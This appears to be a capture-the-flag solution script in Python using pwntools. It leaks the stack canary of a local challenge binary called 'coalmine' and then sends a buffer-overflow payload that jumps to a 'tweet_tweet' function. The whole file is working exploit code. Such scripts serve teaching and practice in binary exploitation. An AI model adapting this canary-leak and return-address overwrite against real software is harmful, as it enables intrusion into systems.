#!/bin/python3
from pwn import *

canaryOffset = 0x30 - 0x10
winOffset = 0x6c - 0x58 # $ebp - $(end of canary addr)


def getCanary():

	p = process('./coalmine')

	# context.log_level = 'debug'

	p.recvuntil(b'> ')

	p.send(f'{canaryOffset}\n'.encode())

	p.recvuntil(b'name? \n')
	p.send(b"A"*canaryOffset)

	p.recvuntil(f'name is {"A"*canaryOffset}'.encode())

	canary = p.recv().rstrip()
	
	return canary

def bof2win(canary):
	elf = ELF('./coalmine')
	r = ROP('./coalmine')

	payload = b''
	payload += b"A"*canaryOffset
	payload += canary
	payload += b"B"*winOffset
	payload += p32(elf.sym['tweet_tweet'])


	p = process('./coalmine')

	# context.log_level = 'debug'

	p.recvuntil(b'> ')
	p.sendline(b'200')
	p.recvuntil(b'> ')
	p.sendline(payload)
	p.interactive()



canary = getCanary()
print(f'Got canary: {str(canary)}')
bof2win(canary)
